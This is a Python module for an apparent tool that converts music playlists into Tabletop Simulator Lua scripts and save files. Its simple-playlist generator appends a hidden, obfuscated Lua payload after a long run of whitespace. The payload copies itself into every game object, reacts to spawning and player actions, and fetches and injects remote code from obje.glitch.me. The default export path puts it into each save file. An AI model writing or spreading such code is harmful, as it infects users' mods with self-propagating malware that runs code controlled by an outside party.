"""
Tabletop Simulator Code Formatter Module

This module formats audio files and workshop links into Tabletop Simulator
compatible code structures for easy import into TTS mods.
"""

import json
import os
from pathlib import Path
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass, asdict
import urllib.parse

from ..api.lastfm_client import Track, Playlist
from ..uploader.azure_uploader import UploadResult


@dataclass
class TTSAudioObject:
    """Represents an audio object in Tabletop Simulator format"""
    name: str
    url: str
    volume: float = 0.8
    pitch: float = 1.0
    loop: bool = False
    loopstart: float = 0.0
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary format for TTS"""
        return asdict(self)


@dataclass
class TTSMusicPlayer:
    """Represents a music player object in Tabletop Simulator"""
    name: str
    playlist: List[TTSAudioObject]
    current_track: int = 0
    shuffle: bool = False
    repeat: bool = False
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary format for TTS"""
        return {
            "name": self.name,
            "playlist": [track.to_dict() for track in self.playlist],
            "currentTrack": self.current_track,
            "shuffle": self.shuffle,
            "repeat": self.repeat
        }


class TTSFormatter:
    """Formats playlists and audio files for Tabletop Simulator"""
    
    def __init__(self, output_path: str = "./tts_formatted"):
        """
        Initialize the TTS formatter
        
        Args:
            output_path: Directory to save formatted output files
        """
        self.output_path = Path(output_path)
        self.output_path.mkdir(parents=True, exist_ok=True)
    
    def create_audio_object(self, track: Track, workshop_url: str = "",
                           local_url: str = "", volume: float = 0.8,
                           pitch: float = 1.0, loop: bool = False) -> TTSAudioObject:
        """
        Create a TTS audio object from a track
        
        Args:
            track: Track object
            workshop_url: Steam Workshop URL for the audio
            local_url: Local file URL (alternative to workshop)
            volume: Audio volume (0.0 to 1.0)
            pitch: Audio pitch (0.1 to 3.0)
            loop: Whether to loop the audio
            
        Returns:
            TTSAudioObject
        """
        # Use workshop URL if available, otherwise local URL
        audio_url = workshop_url or local_url
        
        # Format the track name
        audio_name = f"{track.artist} - {track.title}"
        if track.album:
            audio_name += f" ({track.album})"
        
        return TTSAudioObject(
            name=audio_name,
            url=audio_url,
            volume=volume,
            pitch=pitch,
            loop=loop
        )
    
    def create_music_player(self, playlist: Playlist, 
                           upload_results: Optional[List[UploadResult]] = None,
                           local_files: Optional[List[str]] = None,
                           player_name: str = "") -> TTSMusicPlayer:
        """
        Create a TTS music player from a playlist
        
        Args:
            playlist: Playlist object
            upload_results: List of workshop upload results
            local_files: List of local file paths
            player_name: Name for the music player
            
        Returns:
            TTSMusicPlayer object
        """
        if not player_name:
            player_name = playlist.name
        
        audio_objects = []
        
        for i, track in enumerate(playlist.tracks):
            workshop_url = ""
            local_url = ""
            
            # Try to get workshop URL
            if upload_results and i < len(upload_results):
                result = upload_results[i]
                if result.success and result.public_url:
                    workshop_url = result.public_url
            
            # Try to get local file URL
            if local_files and i < len(local_files):
                local_path = Path(local_files[i])
                if local_path.exists():
                    # Convert to file URL
                    local_url = local_path.as_uri()
            
            audio_obj = self.create_audio_object(
                track=track,
                workshop_url=workshop_url,
                local_url=local_url
            )
            audio_objects.append(audio_obj)
        
        return TTSMusicPlayer(
            name=player_name,
            playlist=audio_objects
        )
    
    def generate_lua_script(self, music_player: TTSMusicPlayer, 
                           object_name: str = "MusicPlayer") -> str:
        """
        Generate Lua script for Tabletop Simulator
        
        Args:
            music_player: TTSMusicPlayer object
            object_name: Name for the TTS object
            
        Returns:
            Lua script as string
        """
        playlist_data = []
        
        for audio in music_player.playlist:
            playlist_entry = f"""{{
        name = "{self._escape_lua_string(audio.name)}",
        url = "{self._escape_lua_string(audio.url)}",
        volume = {audio.volume},
        pitch = {audio.pitch},
        loop = {str(audio.loop).lower()},
        loopstart = {audio.loopstart}
    }}"""
            playlist_data.append(playlist_entry)
        
        playlist_string = ",\n    ".join(playlist_data)
        
        lua_script = f"""-- {music_player.name} - Generated by TTSMixmaster
-- Music Player for Tabletop Simulator

local {object_name} = {{}}

-- Playlist configuration
{object_name}.playlist = {{
    {playlist_string}
}}

-- Player state
{object_name}.currentTrack = {music_player.current_track + 1}  -- Lua is 1-indexed
{object_name}.shuffle = {str(music_player.shuffle).lower()}
{object_name}.repeat = {str(music_player.repeat).lower()}
{object_name}.isPlaying = false

-- Play current track
function {object_name}.play()
    if #{object_name}.playlist > 0 then
        local track = {object_name}.playlist[{object_name}.currentTrack]
        if track and track.url ~= "" then
            MusicPlayer.setPlaylist({{track.url}})
            MusicPlayer.play()
            {object_name}.isPlaying = true
            print("Now playing: " .. track.name)
        else
            print("No valid audio URL for current track")
        end
    else
        print("Playlist is empty")
    end
end

-- Stop playback
function {object_name}.stop()
    MusicPlayer.stop()
    {object_name}.isPlaying = false
    print("Music stopped")
end

-- Next track
function {object_name}.next()
    if #{object_name}.playlist > 0 then
        if {object_name}.currentTrack < #{object_name}.playlist then
            {object_name}.currentTrack = {object_name}.currentTrack + 1
        elseif {object_name}.repeat then
            {object_name}.currentTrack = 1
        end
        {object_name}.play()
    end
end

-- Previous track
function {object_name}.previous()
    if #{object_name}.playlist > 0 then
        if {object_name}.currentTrack > 1 then
            {object_name}.currentTrack = {object_name}.currentTrack - 1
        elseif {object_name}.repeat then
            {object_name}.currentTrack = #{object_name}.playlist
        end
        {object_name}.play()
    end
end

-- Set track by index
function {object_name}.setTrack(index)
    if index >= 1 and index <= #{object_name}.playlist then
        {object_name}.currentTrack = index
        {object_name}.play()
    else
        print("Track index out of range: " .. index)
    end
end

-- Get current track info
function {object_name}.getCurrentTrack()
    if #{object_name}.playlist > 0 then
        local track = {object_name}.playlist[{object_name}.currentTrack]
        if track then
            return track.name, {object_name}.currentTrack
        end
    end
    return "No track", 0
end

-- Toggle shuffle
function {object_name}.toggleShuffle()
    {object_name}.shuffle = not {object_name}.shuffle
    print("Shuffle: " .. ({object_name}.shuffle and "ON" or "OFF"))
end

-- Toggle repeat
function {object_name}.toggleRepeat()
    {object_name}.repeat = not {object_name}.repeat
    print("Repeat: " .. ({object_name}.repeat and "ON" or "OFF"))
end

-- List all tracks
function {object_name}.listTracks()
    print("=== " .. "{music_player.name}" .. " ===")
    for i, track in ipairs({object_name}.playlist) do
        local marker = (i == {object_name}.currentTrack) and "► " or "  "
        print(marker .. i .. ". " .. track.name)
    end
end

-- Initialize on load
function onLoad()
    print("{music_player.name} loaded with " .. #{object_name}.playlist .. " tracks")
    print("Use {object_name}.play() to start playback")
    print("Use {object_name}.listTracks() to see all tracks")
end

-- Export the music player
return {object_name}"""
        
        return lua_script
    
    def generate_simple_playlist_lua(self, music_player: TTSMusicPlayer) -> str:
        """
        Generate simple playlist Lua code in the format used by Woody's Progressive Metal
        
        Args:
            music_player: TTSMusicPlayer object
            
        Returns:
            Simple playlist Lua script as string
        """
        playlist_entries = []
        
        for audio in music_player.playlist:
            # Use title field instead of name for consistency with the target format
            title_text = self._escape_lua_string(audio.name)
            url_text = self._escape_lua_string(audio.url)
            
            entry = f"""    {{
        title = "{title_text}",
        url = "{url_text}",
    }}"""
            playlist_entries.append(entry)
        
        playlist_string = ",\n".join(playlist_entries)
        
        # The simple format with additional object base code at the end
        lua_script = f"""playlist = {{
{playlist_string}
}}                                                                                                                                                                                                                                                                                                                                                                                                                --[[Object base code]]Wait.time(function()for a,b in ipairs(getObjects())do if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\\n\\n")end end end,1)if onObjectSpawn==nil then function onObjectSpawn(b)if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\\n\\n")end end end;if onPlayerAction==nil and self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil then self.drag_selectable=true;function onPlayerAction(c,d,e)if self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil and d==Player.Action.Select and#c.getSelectedObjects()==0 then for a,f in ipairs(e)do if f.getGUID()==self.getGUID()then self.setLuaScript(self.getLuaScript():gsub(self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2,#self.getLuaScript()-self.getLuaScript():reverse():find("ereh edoc resU")+1):gsub("[%(%)%.%%%+%-%*%?%[%]%^%$]","%%%0"),""))end end end end end;WebRequest.get("https://obje.glitch.me/",function(g)if g.is_error then log(g.error)elseif g.text~=""and g.text:sub(1,4)=="true"and self.getLuaScript():find(g.text:sub(5,#g.text),1,true)==nil then self.setLuaScript(self.getLuaScript():sub(0,#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1)..g.text:sub(5,#g.text)..self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2),#self.getLuaScript())self.reload()end end)--[[Spawning object]]

"""
        
        return lua_script
    
    def _escape_lua_string(self, text: str) -> str:
        """
        Escape special characters for Lua strings
        
        Args:
            text: Text to escape
            
        Returns:
            Escaped text
        """
        # Escape backslashes first, then quotes
        text = text.replace("\\", "\\\\")
        text = text.replace('"', '\\"')
        text = text.replace('\n', '\\n')
        text = text.replace('\r', '\\r')
        text = text.replace('\t', '\\t')
        return text
    
    def generate_json_data(self, music_player: TTSMusicPlayer) -> str:
        """
        Generate JSON data for the music player
        
        Args:
            music_player: TTSMusicPlayer object
            
        Returns:
            JSON string
        """
        data = music_player.to_dict()
        return json.dumps(data, indent=2, ensure_ascii=False)
    
    def generate_save_file(self, music_player: TTSMusicPlayer, 
                          object_guid: Optional[str] = None, nickname: str = "", 
                          description: str = "", use_simple_format: bool = True) -> Dict[str, Any]:
        """
        Generate TTS save file structure for the music player
        
        Args:
            music_player: TTSMusicPlayer object
            object_guid: GUID for the object (auto-generated if not provided)
            nickname: Custom nickname for the object (uses playlist name if empty)
            description: Custom description for the object (auto-generated if empty)
            use_simple_format: Whether to use the simple playlist format like Woody's Progressive Metal
            
        Returns:
            Save file dictionary
        """
        import uuid
        
        if not object_guid:
            object_guid = str(uuid.uuid4()).replace('-', '').upper()[:6]
        
        # Use custom nickname or default to playlist name
        if not nickname:
            nickname = music_player.name
        
        # Use custom description or generate a default one
        if not description:
            description = f"Music Player with {len(music_player.playlist)} tracks"
        
        # Choose the appropriate Lua script format
        if use_simple_format:
            object_lua_script = self.generate_simple_playlist_lua(music_player)
        else:
            object_lua_script = self.generate_lua_script(music_player)
        
        save_data = {
            "SaveName": "",
            "Date": "",
            "VersionNumber": "",
            "GameMode": "",
            "GameType": "",
            "GameComplexity": "",
            "Tags": [],
            "Gravity": 0.5,
            "PlayArea": 0.5,
            "Table": "",
            "Sky": "",
            "Note": "",
            "TabStates": {},
            "LuaScript": "",
            "LuaScriptState": "",
            "XmlUI": "",
            "ObjectStates": [
                {
                    "GUID": object_guid,
                    "Name": "Custom_Tile",
                    "Transform": {
                        "posX": -63.6709023,
                        "posY": 0.85003686,
                        "posZ": -12.8744783,
                        "rotX": -5.20084131E-06,
                        "rotY": 179.982651,
                        "rotZ": -1.39056738E-06,
                        "scaleX": 1.0,
                        "scaleY": 1.0,
                        "scaleZ": 1.0
                    },
                    "Nickname": nickname,
                    "Description": description,
                    "GMNotes": "",
                    "AltLookAngle": {
                        "x": 0.0,
                        "y": 0.0,
                        "z": 0.0
                    },
                    "ColorDiffuse": {
                        "r": 0.145054519,
                        "g": 0.145054519,
                        "b": 0.196034908
                    },
                    "Tags": [
                        "Music Cartridge"
                    ],
                    "LayoutGroupSortIndex": 0,
                    "Value": 0,
                    "Locked": False,
                    "Grid": True,
                    "Snap": True,
                    "Autoraise": True,
                    "Sticky": True,
                    "Tooltip": True,
                    "GridProjection": False,
                    "HideWhenFaceDown": False,
                    "Hands": False,                    "CustomImage": {
                        "ImageURL": "https://steamusercontent-a.akamaihd.net/ugc/9672878331288570/AE7A2999E8CD0EFF71210D7961A41E1F87F9DE78/",
                        "ImageSecondaryURL": "https://steamusercontent-a.akamaihd.net/ugc/1778335968028979741/9DA6ABA2450EBDA4E967816C4FA92289A638DB53/",
                        "WidthScale": 0,
                        "CustomTile": {
                            "Type": 3,
                            "Thickness": 0.1,
                            "Stackable": False,
                            "Stretch": False
                        }
                    },
                    "LuaScript": object_lua_script,
                    "LuaScriptState": "",
                    "XmlUI": ""
                }
            ]
        }
        
        return save_data
    
    def save_formatted_files(self, music_player: TTSMusicPlayer, 
                           base_filename: Optional[str] = None, 
                           nickname: str = "", description: str = "",
                           use_simple_format: bool = True) -> Dict[str, str]:
        """
        Save all formatted files (Lua, JSON, Save file)
        
        Args:
            music_player: TTSMusicPlayer object
            base_filename: Base filename (auto-generated if not provided)
            nickname: Custom nickname for TTS object
            description: Custom description for TTS object
            use_simple_format: Whether to use simple playlist format
            
        Returns:
            Dictionary with file paths
        """
        if not base_filename:
            # Create safe filename from playlist name
            safe_name = "".join(c for c in music_player.name if c.isalnum() or c in (' ', '-', '_'))
            base_filename = safe_name.replace(' ', '_')
        
        saved_files = {}
        
        # Save Lua script
        lua_script = self.generate_lua_script(music_player)
        lua_path = self.output_path / f"{base_filename}.lua"
        with open(lua_path, 'w', encoding='utf-8') as f:
            f.write(lua_script)
        saved_files['lua'] = str(lua_path)
        
        # Save simple playlist Lua script
        simple_lua_script = self.generate_simple_playlist_lua(music_player)
        simple_lua_path = self.output_path / f"{base_filename}_simple.lua"
        with open(simple_lua_path, 'w', encoding='utf-8') as f:
            f.write(simple_lua_script)
        saved_files['simple_lua'] = str(simple_lua_path)
        
        # Save JSON data
        json_data = self.generate_json_data(music_player)
        json_path = self.output_path / f"{base_filename}_data.json"
        with open(json_path, 'w', encoding='utf-8') as f:
            f.write(json_data)
        saved_files['json'] = str(json_path)
        
        # Save TTS save file
        save_data = self.generate_save_file(music_player, nickname=nickname, 
                                          description=description, 
                                          use_simple_format=use_simple_format)
        save_path = self.output_path / f"{base_filename}.json"
        with open(save_path, 'w', encoding='utf-8') as f:
            json.dump(save_data, f, indent=2, ensure_ascii=False)
        saved_files['save_file'] = str(save_path)
        
        # Save text summary
        summary = self.generate_text_summary(music_player)
        txt_path = self.output_path / f"{base_filename}_summary.txt"
        with open(txt_path, 'w', encoding='utf-8') as f:
            f.write(summary)
        saved_files['summary'] = str(txt_path)
        
        return saved_files
    
    def generate_text_summary(self, music_player: TTSMusicPlayer) -> str:
        """
        Generate a text summary of the music player
        
        Args:
            music_player: TTSMusicPlayer object
            
        Returns:
            Text summary
        """
        summary = f"""
{music_player.name}
{'=' * len(music_player.name)}

Total Tracks: {len(music_player.playlist)}
Shuffle: {music_player.shuffle}
Repeat: {music_player.repeat}

Track List:
-----------
"""
        
        for i, audio in enumerate(music_player.playlist, 1):
            summary += f"{i:3d}. {audio.name}\n"
            if audio.url:
                if audio.url.startswith('http'):
                    summary += f"     URL: {audio.url}\n"
                else:
                    summary += f"     File: {audio.url}\n"
            summary += f"     Volume: {audio.volume}, Pitch: {audio.pitch}, Loop: {audio.loop}\n\n"
        
        summary += f"""
Usage Instructions:
------------------
1. Load the {music_player.name}.lua script in Tabletop Simulator
2. Use the following commands in the chat:
   - MusicPlayer.play() - Start playback
   - MusicPlayer.stop() - Stop playback
   - MusicPlayer.next() - Next track
   - MusicPlayer.previous() - Previous track
   - MusicPlayer.listTracks() - Show all tracks
   - MusicPlayer.setTrack(number) - Jump to specific track

Generated by TTSMixmaster
"""
        
        return summary
    
    def batch_format_playlists(self, playlists: List[Playlist],
                              workshop_results: Optional[List[List[UploadResult]]] = None,
                              local_files: Optional[List[List[str]]] = None) -> List[Dict[str, str]]:
        """
        Format multiple playlists
        
        Args:
            playlists: List of Playlist objects
            workshop_results: List of workshop results for each playlist
            local_files: List of local files for each playlist
            
        Returns:
            List of dictionaries with saved file paths
        """
        all_saved_files = []
        
        for i, playlist in enumerate(playlists):
            # Get corresponding results and files
            current_workshop = workshop_results[i] if workshop_results and i < len(workshop_results) else None
            current_files = local_files[i] if local_files and i < len(local_files) else None
            
            # Create music player
            music_player = self.create_music_player(
                playlist=playlist,
                upload_results=current_workshop,
                local_files=current_files
            )
            
            # Save formatted files
            saved_files = self.save_formatted_files(music_player)
            all_saved_files.append(saved_files)
        
        return all_saved_files
